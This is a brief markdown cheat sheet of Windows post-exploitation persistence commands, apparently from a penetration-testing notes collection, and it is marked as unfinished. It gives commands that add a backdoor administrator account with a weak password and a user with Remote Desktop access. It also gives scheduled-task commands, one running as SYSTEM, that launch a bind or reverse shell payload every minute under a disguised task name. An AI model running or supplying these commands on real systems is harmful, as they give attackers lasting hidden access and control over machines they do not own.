# Place Holder

## Add an Administrator
```net user adm adm1 /add```
```net localgroup administrators adm /add```

## Add a Limited User with RDP Access
```net user lowlevel lowlevel1 /add```
```net localgroup "Remote Desktop USers" lowlevel /add```

## Schedule a Bind or Reverse EXE Payload to Run
```schtasks /create /TN "WindowsTaskSys1" /TR "C:\Users\low\executable.exe" /sc MINUTE```

## Scheduel a Bind or Reverse EXE Payload to Run as SYSTEM
```schtasks /create /TN "WindowsTaskSys1" /TR "C:\Users\low\executable.exe" /sc MINUTE /RU "SYSTEM"```

Content coming. Feel free to submit ;-)
